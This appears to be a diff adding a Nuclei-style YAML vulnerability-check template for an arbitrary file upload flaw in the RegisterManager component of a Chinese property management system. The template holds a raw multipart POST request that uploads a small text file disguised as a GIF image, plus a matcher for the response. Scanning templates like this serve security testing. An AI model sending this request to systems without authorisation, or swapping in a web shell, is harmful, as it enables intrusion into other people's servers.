@@ -1,0 +1,36 @@
+id: xsc-RegisterManager-upload
+info:
+  name: xsc-RegisterManager-upload
+  author: apple
+  severity: critical
+  description: 新视窗新一代物业管理系统RegisterManager存在任意文件上传漏洞
+  reference:
+    - https://
+  tags: tags
+http:
+  - raw:
+      - |+
+        POST /OfficeManagement/RegisterManager/Upload.aspx HTTP/1.1
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36
+        Cookie: JSESSIONID=FC2204F3698D2A07CDE9786055A071CB
+        Content-Type: multipart/form-data; boundary=00content0boundary00
+        Host: {{Hostname}}
+        Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
+        Content-Length: 159
+        Connection: close
+
+        --00content0boundary00
+        Content-Disposition: form-data; name="file"; filename="1.txt"
+        Content-Type: image/jpg
+
+        GIF89a
+        123
+        --00content0boundary00--
+
+
+
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '.txt'
